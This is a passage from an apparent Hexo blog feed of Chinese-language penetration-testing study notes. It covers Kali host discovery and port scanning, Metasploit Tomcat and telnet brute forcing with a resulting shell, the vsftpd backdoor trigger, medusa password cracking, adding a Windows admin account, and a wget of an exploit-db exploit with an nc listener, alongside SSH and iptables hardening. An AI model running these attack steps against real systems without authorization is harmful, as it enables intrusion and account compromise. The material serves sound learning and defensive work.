src="https://img-blog.csdnimg.cn/20200723144132219.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后找管理，需要输入用户名和密码才能进行访问。<br><img src="https://img-blog.csdnimg.cn/20200723144152176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h3 id="msf破解tomcat用户和密码"><a href="#msf破解tomcat用户和密码" class="headerlink" title="msf破解tomcat用户和密码"></a>msf破解tomcat用户和密码</h3><p>使用<code>auxiliary/scanner/http/tomcat_mgr_login</code>模块<br><img src="https://img-blog.csdnimg.cn/2020072314422173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>所以用户名和密码都是tomcat<br>直接登录查看。<br><img src="https://img-blog.csdnimg.cn/20200723144411702.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h3 id="msf利用tomcat管理"><a href="#msf利用tomcat管理" class="headerlink" title="msf利用tomcat管理"></a>msf利用tomcat管理</h3><p>利用metasploit中的模块为<br><code>exploit/multi/http/tomcat_mgr_deploy</code><br>同样需要设置好参数，才能执行。</p><p><img src="https://img-blog.csdnimg.cn/20200723144955196.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>也可以利用反弹的shell获取用户权限。<br><img src="https://img-blog.csdnimg.cn/20200723145021120.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>不过可以看出这个并不是root用户权限。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>终于把这些基本的简单漏洞利用学的差不多了，这些主要是利用metasploit进行利用，也是对metasploit的练习，让更加了解和熟练使用metasploit。<br>这次学习到很多。</p>]]></content>
      
      
      
        <tags>
            
            <tag> encryptAsDiary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2020/08/23/hello-world/"/>
      <url>/2020/08/23/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>漏洞扫描</title>
      <link href="/2020/07/30/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"/>
      <url>/2020/07/30/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h1><h2 id="二层主机发现"><a href="#二层主机发现" class="headerlink" title="二层主机发现"></a>二层主机发现</h2><p>定义：利用OSI中链路层中的协议进行主机发现。一般使用ARP协议。<br>优点：(局域网中通信使用ARP协议，利用MAC地址作为对应的识别地址)<br>1.速度快<br>2.可靠性高<br>缺点：<br>无法扫描经过路由的主机<br>二层发现-arping工具<br>(kali自带)<br><code>arping --help</code><br>扫描，使用命令<br><code>arping 192.168.0.1</code><br>扫描一次    <code>arping  -c 1 192.168.0.1</code><br>可限定扫描次数<br>二层扫描工具-netdiscover工具<br>kali自带netdiscover可以针对特定子网进行多主机扫描。<br>查看帮助信息   <code>netdiscover -h</code><br>可直接netdiscover回车进行自动化扫描<br>对当前IP扫描<br><code>discover -r 192.168.1.1/24(IP可自定义)</code></p><h2 id="三层主机发现"><a href="#三层主机发现" class="headerlink" title="三层主机发现"></a>三层主机发现</h2><p>定义：利用OSI中网络中的协议进行主机发现。一般使用ICMP协议。<br>优点：<br>1.可以发现远程主机，经过路由的主机(弥补二层发现的缺点)<br>2.速度相对比较快<br>缺点：<br>1.经常被防火墙过滤<br>2.速度相比二层发现慢<br>三层发现-ping工具<br>ping工具在kali和linux中都有自带，linux下ping如果不指定<code>-c</code>参数，会一直扫描。windows系统下，默认进行<strong>四次探测</strong>。<br>如果关闭防火墙，那么ping就不能够ping的通了。<br>三层发现工具-fping工具<br>kali自带的fping可以进行对应的三层主机发现，可以针对多个主机同时进行主机发现。<br><code>fping -g 192.168.1.0/24</code><br>可以扫描在子网段的主机存活状态。<br>hping3工具（kali自带）<br>对目标进行三层主机发现，特点：发送自定义ICMP数据包<br><code>hping3 -c 2 --icmp 192.168.1.1</code><br>或者：<code>hping3 -c 3 -1 192.168.1.1</code></p><h2 id="四层主机发现"><a href="#四层主机发现" class="headerlink" title="四层主机发现"></a>四层主机发现</h2><p>四层发现指利用OSI中的传输层协议进行主机发现，一般使用TCP、UDP探测<br>优点：<br>1.可以探测远程主机<br>2.比三层发现更为可靠<br>缺点<br>花费时间更长<br>工具nmap<br>(kali自带)<br>nmap IP地址、<br>hping3工具也可以进行四层发现<br>命令使用：<br><code>hping3 --udp -c -3  -p IP地址</code><br>python脚本<br>（暂时用不到，用到的话找百度找一下）</p><h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><ol><li>nmap扫描<br>nmap IP地址<br>功能强大</li><li>Dmitry工具<br>kali自带<br>简单使用：dmitry -p IP地址<br>扫描的端口没有nmap多</li><li>netcat工具<br>简单使用命令：<br><code>nc -nvz IP地址 端口范围</code><br>如：<code>nc -nvz 192.168.40.138 1-5000</code></li></ol><p>端口Banner获取<br>nmap获取<br>简单命令使用：<br><code>nmap [ip] -p [指定端口] --script banner</code><br>如：<code>nmap 192.168.1.105 -p 22 --script banner</code><br>还可以范围扫描<br>比如：<code>nmap [ip] --script banner -p 20-30</code><br>dmitry获取端口banner信息</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dmitry <span class="literal">-pb</span> [<span class="type">ip</span>]</span><br><span class="line">dmitry <span class="literal">-pb</span> <span class="number">192.168</span>.<span class="number">1.105</span></span><br></pre></td></tr></table></figure><p>netcat获取banner信息<br>简单命令：<br><code>nc -vn [ip] [port]</code></p><p>端口服务版本信息获取<br>利用nmap获取目标系统的端口版本信息<br>nmap -p [port] -sV [ip]<br>获取操作系统版本信息<br>使用nmap进行探测<br>简单命令：<br><code>nmap -O [ip]</code><br>如：<code>nmap -O 192.168.10.105</code><br>一条命令测全部信息(需要在授权的情况下)<br>进行完整测试<br><code>nmap -A -v [ip]</code></p><h1 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h1><p>nmap进行扫描<br><code>nmap --script vuln [ip]</code><br>nessus扫描漏洞</p><p>web漏洞扫描器<br>1、Owasp-zap<br>2、AWVS<br>3、Appscan<br>4、Nikto<br>5、Burpsuite<br>每个扫描器都有各自不同的payload进行探测<br>Owasp-zap漏洞扫描<br>nikto扫描<br>kali自带<br>使用：    <code>nikto -host [ip]</code><br>进行漏洞扫描<br>扫描到SQL注入漏洞后，可以使用sqlmap进行注入 漏洞利用</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="一、FTP协议介绍"><a href="#一、FTP协议介绍" class="headerlink" title="一、FTP协议介绍"></a>一、FTP协议介绍</h2><p>文件传输协议，是用于在网络上进行文件传输的一套标准协议，使用客户/服务器模式，它属于网络传输协议的应用层。FTP使用的是21号端口。<br>FTP将用户分为三类：<br>1、Real用户<br>2、Administrator  超级用户可以进行任何操作<br>3、匿名用户   （可能出现漏洞的地方）<br>FTP文件传输格式：<br>1、ascii<br>2、二进制格式<br>利用FTP匿名登录漏洞<br>由于FTP没有禁止匿名用户，所以可以直接使用Anonymous用户直接登录FTP服务器。<br>使用nc连接FTP<br>匿名登录FTP服务器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc [ip] [port]</span><br><span class="line">输入USER anonymous</span><br><span class="line">输入PASS [mima]（可以为空）</span><br><span class="line">输入<span class="built_in">help</span>查看可以执行的命令</span><br></pre></td></tr></table></figure><p>先使用nmap进行扫描，查看目标IP的21号端口是否开放<br><code>nmap -p 21 192.168.1.106</code><br>如果开放，那么可以扫描查看是否存在漏洞<br><code>nmap --script vuln -p 21 192.168.1.106</code><br>如果存在匿名登录漏洞，那么就可以进行登录<br>PWD查看当前工作的目录<br>QUIT退出登录<br>不想使用命令行，网上有连接FTP的软件，可以找一下。<br>利用FTP后门漏洞<br>vsftpd手工触发漏洞：当进行FTP认证时，如果用户名USER中包含:)，那么直接就触发监听6200端口的连接shell。<br>比如nc连接时输入用户名，格式写成这样： <code>USER user:)</code><br>就可以自动触发6200监听端口，可以使用nc连接6200端口。<br>FTP安全配置<br>关闭匿名登陆权限，修改配置文件。<br>对特定漏洞进行打补丁<br>比如说2.3.4的版本有后门，那么我们换3.0.0版本就行。<br>或者设置防火墙禁止连接后门端口。<br>使用命令：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables <span class="literal">-A</span> INPUT <span class="literal">-p</span> tcp <span class="literal">-dport</span> <span class="number">6200</span> <span class="literal">-j</span> DROP</span><br><span class="line">iptables <span class="literal">-A</span> OUTPUT <span class="literal">-p</span> tcp <span class="literal">-sport</span> <span class="number">6200</span> <span class="literal">-j</span> DROP</span><br></pre></td></tr></table></figure><p>一条输入，一条输出。这样阻断外界与6200端口的连接。</p><h2 id="二、FTP不可避免的问题"><a href="#二、FTP不可避免的问题" class="headerlink" title="二、FTP不可避免的问题"></a>二、FTP不可避免的问题</h2><p>FTP用户名密码暴力破解<br>windows下cmd命令添加用户，以及提升Administrator管理员权限</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user [用户名] [用户密码] /add</span><br><span class="line">net localgroup administrators [用户名] /add</span><br></pre></td></tr></table></figure><p>使用medusa暴力破解FTP登录<br>kali自带工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">medusa -h [ip] -u [用户名] -P [密码字典文件路径] -M ftp   暴力批量破解</span><br><span class="line">medusa -h [ip] -u [用户名] -p [密码] -M ftp      暴力单个密码破解</span><br></pre></td></tr></table></figure><h2 id="Ubuntu搭建ssh服务端"><a href="#Ubuntu搭建ssh服务端" class="headerlink" title="Ubuntu搭建ssh服务端"></a>Ubuntu搭建ssh服务端</h2><p><code>sudo apt-get install openssh-server</code><br>ssh服务端的启动和关闭<br>启动：<code>service ssh start</code><br>状态获取：<code>service ssh status</code><br>关闭：<code>service ssh stop</code><br>Ubuntu搭建ssh客户端<br>首先安装putty工具<br><code>sudo apt-get install putty-tools</code><br>然后在软件中心搜索putty安装。<br><img src="https://img-blog.csdnimg.cn/20200528173206115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>安装完毕后，打开<br>输入本机的IP地址，其他的默认就行。<br><img src="https://img-blog.csdnimg.cn/20200528173218883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>然后连接(前提是ssh是开启状态)open<br>连接后，输入用户名和密码，就连接成功了。进行一系列的操作哦。<br>ssh banner信息获取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap获取ssh Banner信息</span><br><span class="line">nmap -sV -p 22 [ip]</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200528173236194.png" alt="j4y" loading="lazy"><br>msfconsole<br><img src="https://img-blog.csdnimg.cn/20200528173300230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>鸭子哈哈。<br><img src="https://img-blog.csdnimg.cn/20200528173319817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>按照操作步骤，进行就能得到banner信息</p><p>使用nc也行，<br><img src="https://img-blog.csdnimg.cn/20200528173339201.png" alt="j4y" loading="lazy"><br>简单，查询迅速。<br>配置ssh规避banner信息<br>在ssh配置文件sshd_config中新增一行。<br>进入到/etc/ssh路径下，输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit </span><br><span class="line">sshd_config</span><br><span class="line">ctrl+F搜索banner</span><br><span class="line">加一句DebianBanner no 再次扫描发现没有操作系统信息。</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020052817343391.png" alt="j4y" loading="lazy"><br>没有banner信息了。<br>ssh弱口令破解利用<br>Medusa SSH弱口令破解<br>如果在设置ssh服务时，管理员设置了容易被猜解出来的用户名和密码（弱口令）。那么测试人员就可以使用对应的密码工具进行暴力破解弱口令。破解出来就可以使用对应的用户名和密码登录系统。<br>单个密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">medusa -h [ip] -u [用户名] -p [密码] -M ssh</span><br><span class="line">批量破解，有字典</span><br><span class="line">medusa -h [ip] -u [用户名] -P [密码] -M ssh</span><br><span class="line">尝试破解qwzf密码，失败哈哈。没有字典。</span><br></pre></td></tr></table></figure><p>ssh命令行工具登录<br>一般情况下linux下都具有ssh客户端，用来登录ssh服务端<br><code>可以使用ssh 用户名@IP地址  然后根据提示输入密码。</code><br><img src="https://img-blog.csdnimg.cn/20200528173519188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>可以进行在命令行(终端)的操作<br>输入exit退出连接(登出)</p><p>Metasploit利用ssh登录反弹Shell<br>使用Metasploit可以进行ssh登录破解，会自动建立对应的Bash shell连接<br><img src="https://img-blog.csdnimg.cn/20200528173546383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>输入msfconsole回车等待一会儿<br><img src="https://img-blog.csdnimg.cn/20200528173556123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20200528173602570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20200528173609158.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>可以进行在命令行的一些操作。<br><img src="https://img-blog.csdnimg.cn/2020052817362028.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>输入exit退出服务。<br>ssh安全防御<br>1、ssh修改默认端口<br>默认情况下，ssh使用22端口，为了安全，一般情况下都会修改默认端口。<br>修改ssh配置文件，讲port改为其他的端口。<br>cd /etc/ssh/<br>ls<br>sudo gedit sshd_config</p><p>修改后记得重启ssh服务。<br>ssh设置PGP登录<br>默认情况下，ssh使用用户名和密码进行远程登录，但也可以使用密钥对进行身份验证登录（公钥与私钥）<br>生成ssh密钥对，使用puttygen<br>下载链接： <a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">点击下载</a></p><p>使用 ssh-keygen命令在linux生成.ssh目录，在.ssh下新建密钥存储文件authorized_keys，并复制私钥文件到.ssh目录录下。使用命令puttygen -L “拷贝私钥文件”，并将内容拷贝到authorized_keys文件中。<br>看着有点懵，需要的话，跟着视频操作一下。</p><p>ssh防御暴力破解用户账号<br>设置ssh配置文件中ctrl+f找到password</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#change to no to  disable tunnelled clear text passwords</span></span><br><span class="line"><span class="comment"># PasswordAuthentication yes</span></span><br></pre></td></tr></table></figure><p>将第二句的注释符去掉，并将yes改为no<br>重启服务。<br>问题是：不能使用用户名密码进行登录，进行操作的话很复杂。<br>虽然能防止暴力破解，缺点也比较明显</p><p>IPtables设置阀(fa)值防止暴力破解<br>使用iptables对多次连接验证错误，进行帐户锁定120秒</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo iptables <span class="literal">-I</span> INPUT <span class="literal">-p</span> tcp -<span class="literal">-dport</span> <span class="number">22</span> <span class="literal">-i</span> eth0 <span class="literal">-m</span> state -<span class="literal">-state</span> NEW <span class="literal">-m</span> recent -<span class="literal">-set</span></span><br><span class="line">sudo iptables <span class="literal">-i</span> INPUT <span class="literal">-p</span> tcp -<span class="literal">-dport</span> <span class="number">22</span> <span class="literal">-i</span> eth0 <span class="literal">-m</span> state -<span class="literal">-state</span> NEW <span class="literal">-m</span> recent -<span class="literal">-update</span> -<span class="literal">-seconds</span> <span class="number">120</span> -<span class="literal">-hitcount</span> <span class="number">3</span> <span class="literal">-j</span> DROP</span><br></pre></td></tr></table></figure><p>设置完成后，重新启动ssh服务。<br>还是这个办法不错点。</p><h2 id="Telnet服务漏洞利用"><a href="#Telnet服务漏洞利用" class="headerlink" title="Telnet服务漏洞利用"></a>Telnet服务漏洞利用</h2><p>telnet介绍<br>Telnet协议是TCP/IP协议家族中的一员，是Internet远程登录服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在终端使用者的电脑上使用telnet程序，用它连接到服务器。终端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样<br>默认端口使用23端口。<br>可以使用nmap。。。尽量多使用nmap<br>检测是否开启telnet服务<br>获取telnet版本信息<br>    1. 使用nmap：   </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="literal">-p</span> <span class="number">23</span> <span class="literal">-sV</span> <span class="number">192.168</span>.<span class="number">1.105</span></span><br></pre></td></tr></table></figure><p>然后可以看到23端口的telnet服务是否开启。并获取版本信息<br>2. 使用metasploit<br>msfconsole<br>打开后，输入search telnet<br>发现telnet的可使用的模块信息<br>查询，如果很慢的话，使用</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/telnet/telnet_version</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> rhosts <span class="number">192.168</span>.<span class="number">1.105</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>可以看到telnet的信息</p><h3 id="telnet密码破解"><a href="#telnet密码破解" class="headerlink" title="telnet密码破解"></a>telnet密码破解</h3><p>使用metasploit下，针对telnet破解的模块进行用户名和密码的破解<br>在msfconsole下使用search telnet进行查询telnet可以利用的模块<br>使用模块login的那个<br><code>use auxiliary/scanner/telnet/telnet_login</code><br>先设置rhosts<br><code>set rhosts 192.168.1.105</code><br>设置用户名<br><code>set username [用户名]</code><br>设置密码<br><code>set pass_file [字典路径]</code><br>设置线程（高一点，设为10）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> threads <span class="number">10</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>就开始爆破密码了。<br>能够得出密码</p><p>telnet登录<br>还在login模块<br>输入<code>sessions -l</code><br>开始一个会话，<br><code>sessions -i 1</code><br>进入会话，可以使用命令行也就是终端</p><p>telnet客户端连接服务器端<br>windows下是默认不开启telnet服务的，需要手动开启</p><p>打开控制面板（ctrl+R）输入control<br>点击程序—&gt;点击程序与功能中的启用或关闭windows功能</p><p>找到Telnet Client，打对勾</p><p>打开cmd，输入telnet<br>打开服务，在输入    ?<br> 查看帮助信息<br><code>o [ip]</code><br>输入用户名和密码即可登录</p><p>telnet明文密码传输<br>使用wireshark来抓取telnet数据包<br>选择WLAN，然后输入telnet筛选信息。<br>在cmd中进行连接telnet的操作。然后就能看到抓到了数据包。<br>用户名和密码输入后，停止抓包。<br>追踪TCP数据流，就可以看到用户名和密码了。</p><p>telnet登录后提权<br>msf登录telnet<br>在metasploit中使用 telnet_login进行登录，并使用<code>sessions -i id </code>连接shell<br>步骤：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use auxiliary/scanner/telnet_login</span><br><span class="line">show opyions    查看需要设置的信息</span><br></pre></td></tr></table></figure><p>设置相应的IP和用户名还有密码，进行登陆</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run</span><br><span class="line">sessions <span class="literal">-l</span></span><br><span class="line">sessions <span class="literal">-i</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>获得了一个shell</p><p>msf连接shell下载exp<br>使用wget进行下载</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">wget</span> http://www.exploit<span class="literal">-db</span>.com/download/<span class="number">8572</span></span><br></pre></td></tr></table></figure><p>设置 kali  nc 监听<br><code>nc -lvp 4444</code><br>开始监听4444端口<br>再看一遍视频。</p><h2 id="smtp服务漏洞"><a href="#smtp服务漏洞" class="headerlink" title="smtp服务漏洞"></a>smtp服务漏洞</h2><p>Smtp实验环境搭建<br>邮件发送与接受模型<br>邮件发送使用Smtp协议，占用25号端口。而邮件接收使用pop3或imap协议，分别占用110和143端口。<img src="https://img-blog.csdnimg.cn/20200528174254534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>添加主机名和域名（Ubuntu下）<br>为了在本地搭建好邮件服务器，所以需要修改对应内容。使得可以在本地进行域名解析。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/hosts</span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span> mail.test.lab test</span><br><span class="line"></span><br><span class="line">sudo gedit /etc/hostname</span><br><span class="line">test</span><br></pre></td></tr></table></figure><p>修改完成之后使用reboot进行重启，使得修改生效。<br>修改完成后可以使用hostname或hostname -f 查看修改是否成功。<br><img src="https://img-blog.csdnimg.cn/20200528174322400.png" alt="j4y" loading="lazy"><br>Ubuntu安装postfix<br>因为postfix是非常流行的smtp软件，所以ubuntu的主要库中集成了postfix，可以直接使用以下命令安装<br><code>sudo apt-get install postfix</code><br>安装完成后修改配置文件<br><code>sudo gedit /etc/postfix/main.cf</code></p><p>追加子网信息</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">inet_protocols = ipv4</span><br><span class="line">home_mailbox = Maildir/</span><br></pre></td></tr></table></figure><p>修改完成后重新启动服务 postfix<br><code>sudo service postfix restart </code><br>然后使用 netstat -nlv 来查看对应的25端口是否开启。<br><img src="https://img-blog.csdnimg.cn/20200528174359487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>ubuntu安装dovecot</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt<span class="literal">-get</span> install dovecot<span class="literal">-imapd</span> dovecot<span class="literal">-pop3d</span></span><br></pre></td></tr></table></figure><p>安装完成之后进行配置</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/dovecot/conf.d/<span class="number">10</span><span class="literal">-auth</span>.conf</span><br><span class="line">disable_plaintest_auth = yes</span><br><span class="line">auth_mechanisms = plain login</span><br><span class="line">sudo gedit /etc/dovecot/conf.d/<span class="number">10</span><span class="literal">-mail</span>.conf</span><br><span class="line">mail_location = maildir:/home/%u/Maildir</span><br></pre></td></tr></table></figure><p>下面哪行没有注释的，将它改成<code>maildir:/home/%u/Maildir</code><br><code>sudo gedit /etc/dovecot/conf.d/10-master.conf</code><br>设置 port = 143 port 110<br>将这两个端口前面的井号去掉就行。修改完成后使用命令netstat -pantu查看相关配置是否开启修改权限（在10-master.conf文件中）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">unix_listerner auth-usrdb&#123;            </span><br><span class="line">mode = 0600            </span><br><span class="line">user = postfix            </span><br><span class="line">group = postfix</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重新启动dovecot服务</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service dovecot restart  </span><br></pre></td></tr></table></figure><p> 使用netstat -nlv 查看服务端口<br>OK完成。</p><p>枚举smtp用户名<br>telnet测试用户名<br>telnet [ip] [port]     //一般是25号端口</p><p>然后输入    vrfy 电子邮箱地址。<br>    <code>vrfy test@mail.test.lab </code><br>如果存在该用户， 则返回252信息<br>如果不存在则返回550信息。<br>自动化工具测试<br>metasploit测试用户名<br>在meatsploit中有 smtp-enum可以对smtp上的用户名进行枚举。<br>打开metasploit先输入msfconfig</p><figure class="highlight bash"><table><tr><td 